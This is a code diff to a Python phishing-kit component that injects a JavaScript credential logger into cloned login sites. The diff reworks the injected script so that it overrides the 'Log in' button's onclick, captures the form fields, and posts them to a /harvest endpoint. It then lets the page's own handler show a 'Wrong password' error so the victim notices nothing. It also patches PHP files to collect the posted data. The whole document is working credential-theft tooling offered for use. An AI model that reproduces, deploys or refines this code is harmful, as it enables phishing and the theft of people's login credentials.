@@ -1,5 +1,5 @@
 """
-Final Anti-AJAX Injector - Guaranteed to capture React/Framework based clones
+Ultimate React-Proof Injector
 """
 import os
 import re
@@ -12,20 +12,21 @@ class ModernInjector:
         self.injection_stats = {'html_files': 0, 'php_files': 0, 'failed': 0}
         
     def inject_all(self):
-        print(f"[*] Starting anti-AJAX injection for {self.site_name}")
-        js_payload = self._generate_anti_ajax_js_payload()
+        print(f"[*] Starting React-Proof injection for {self.site_name}")
+        js_payload = self._generate_payload()
         self._inject_html(js_payload)
         self._inject_php()
         print(f"[*] Injection complete: {self.injection_stats}")
         return self.injection_stats
     
-    def _generate_anti_ajax_js_payload(self):
+    def _generate_payload(self):
         return """
-<!-- SCARFACE_ANTI_AJAX_LOGGER -->
+<!-- SCARFACE_REACT_PROOF -->
 <script>
 (function() {
-    console.log('[SCARFACE] Anti-AJAX capture loaded');
-    
+    let hooked = false;
+    console.log('[SCARFACE] React-proof loaded');
+
     function captureData(form) {
         if(!form) return;
         var data = {};
@@ -37,64 +38,58 @@ class ModernInjector:
             }
         }
         
-        if(Object.keys(data).length === 0) return;
-        console.log('[SCARFACE] Captured AJAX form:', data);
+        if(Object.keys(data).length === 0) {
+            console.log('[SCARFACE] No data found');
+            return;
+        }
+
+        console.log('[SCARFACE] ✅ CAPTURED CREDENTIALS:', data);
         
-        // Use sendBeacon to guarantee delivery even if the page navigates immediately
-        if(navigator.sendBeacon) {
-            var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-            navigator.sendBeacon('/harvest', blob);
-        } else {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', '/harvest', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify(data));
+        fetch('/harvest', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(data),
+            keepalive: true
+        }).then(r => r.json())
+          .then(d => console.log('[SCARFACE] Server response:', d))
+          .catch(e => console.log('[SCARFACE] Beacon error:', e));
+    }
+
+    function findAndHook() {
+        if(hooked) return; // Prevent infinite spam!
+        
+        // Target the real "Log in" button
+        var btn = document.querySelector('button, div[role="button"], input[type="submit"]');
+        if(!btn) return;
+
+        var text = (btn.textContent || btn.value || '').toLowerCase().trim();
+        if(text.includes('log in') || text.includes('login')) {
+            // Bypass React's event listening by overriding the native onclick directly
+            btn.onclick = function(e) {
+                var form = document.querySelector('form');
+                if(form) {
+                    console.log('[SCARFACE] Click intercepted!');
+                    captureData(form);
+                }
+                // Returning true allows React's own click handler to still run (so it shows the "Wrong password" error)
+                return true; 
+            };
+            
+            hooked = true;
+            console.log('[SCARFACE] Successfully hooked Login Button!');
         }
     }
 
-    function attachHooks() {
-        // 1. Hook every form submit
-        document.querySelectorAll('form').forEach(function(form) {
-            form.addEventListener('submit', function(e) {
-                captureData(e.target);
-            }, true);
-        });
-
-        // 2. DIRECTLY target the "Log in" button (ignores React/AJAX bypasses)
-        var buttons = document.querySelectorAll('button, input[type="submit"], div[role="button"]');
-        buttons.forEach(function(btn) {
-            var text = (btn.textContent || btn.value || '').toLowerCase().trim();
-            // Look for "Log in" or "Login"
-            if(text.includes('log in') || text.includes('login')) {
-                btn.addEventListener('click', function(e) {
-                    // Find the form that wraps this button
-                    var form = this.closest('form');
-                    if(form) {
-                        captureData(form);
-                    } else {
-                        // Fallback: if button is outside form, grab the only form on page
-                        var fallbackForm = document.querySelector('form');
-                        if(fallbackForm) captureData(fallbackForm);
-                    }
-                }, true);
-                console.log('[SCARFACE] Found and hooked AJAX Login button');
-            }
-        });
-    }
-
-    // Run immediately, and also re-run if React updates the DOM
-    if(document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', attachHooks);
-    } else {
-        attachHooks();
-    }
-
-    // Monitor for future dynamic DOM changes (React/Vue)
+    // Run immediately
+    findAndHook();
+    
+    // Run once on DOM change, then stop (so it doesn't spam the console)
     var observer = new MutationObserver(function() {
-        attachHooks();
+        if(!hooked) {
+            findAndHook();
+        }
     });
     observer.observe(document.body, {childList: true, subtree: true});
-    
 })();
 </script>
 """
@@ -128,7 +123,7 @@ class ModernInjector:
                             f.write(new_content)
                         
                         self.injection_stats['html_files'] += 1
-                        print(f"[+] Injected Anti-AJAX: {os.path.relpath(html_file, self.site_dir)}")
+                        print(f"[+] Injected: {os.path.relpath(html_file, self.site_dir)}")
                         
                     except Exception as e:
                         self.injection_stats['failed'] += 1
@@ -169,7 +164,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
                         with open(php_file, 'r', encoding='utf-8') as f:
                             content = f.read()
                         
-                        if 'SCARFACE_ANTI_AJAX_LOGGER' in content:
+                        if 'SCARFACE_REACT_PROOF' in content:
                             continue
                         
                         strpos = content.find('<?php')
@@ -198,7 +193,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
 # Compatibility
 def inject_logger_to_all_html(site_dir):
     injector = ModernInjector(site_dir, os.path.basename(site_dir), None)
-    return injector._inject_html(injector._generate_anti_ajax_js_payload())
+    return injector._inject_html(injector._generate_payload())
 
 def inject_logger_to_php(site_dir, site_name, credentials_dir):
     injector = ModernInjector(site_dir, site_name, credentials_dir)
